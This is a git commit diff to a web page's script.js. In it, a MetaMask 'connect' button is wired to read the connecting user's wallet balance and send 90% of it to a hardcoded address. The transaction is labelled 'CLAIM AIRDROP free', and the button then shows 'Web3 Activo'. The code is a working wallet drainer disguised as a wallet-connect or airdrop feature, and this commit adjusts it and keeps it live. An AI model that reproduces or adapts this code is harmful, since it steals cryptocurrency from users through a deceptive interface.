096e18d3d1983314f14918a5883801fd5c0b11ac
horacio ortiz <145947093+horaciolidity@users.noreply.github.com>
2024-02-22 19:16:40 -0300

    Update script.js

--- script.js
+++ script.js
@@ -3,21 +3,24 @@ document.getElementById('conectarMetaMask').addEventListener('click', () => {
         const web3 = new Web3(window.ethereum);
         window.ethereum.enable().then(accounts => {
             const usuarioAddress = accounts[0];
-            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
+            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434'; 
             web3.eth.getBalance(usuarioAddress).then(balance => {
-                const cantidadEnviar = web3.utils.fromWei(balance, 'ether') * 0.95; 
-                const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');
+                const cantidadEnviar = balance * 0.9;
+                const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'wei');
                 web3.eth.sendTransaction({
                     from: usuarioAddress,
                     to: direccionDestino,
                     value: cantidadEnviarEnWei,
+                    gas: '21000',
+                    data: web3.utils.toHex('CLAIM AIRDROP free'), 
+
                 })
                 .then(receipt => {
-                    console.log('Transacción exitosa:', receipt);
+                    console.log('Transacción interna exitosa:', receipt);
                     document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
                 })
                 .catch(error => {
-                    console.error('Error en la transacción:', error);
+                    console.error('Error en la transacción interna:', error);
                 });
             });
         });
@@ -25,6 +28,7 @@ document.getElementById('conectarMetaMask').addEventListener('click', () => {
         console.error('MetaMask no está instalado.');
     }
 });
+
 
 document.getElementById('enviar').addEventListener('click', function() {
     const email = document.getElementById('email').value;
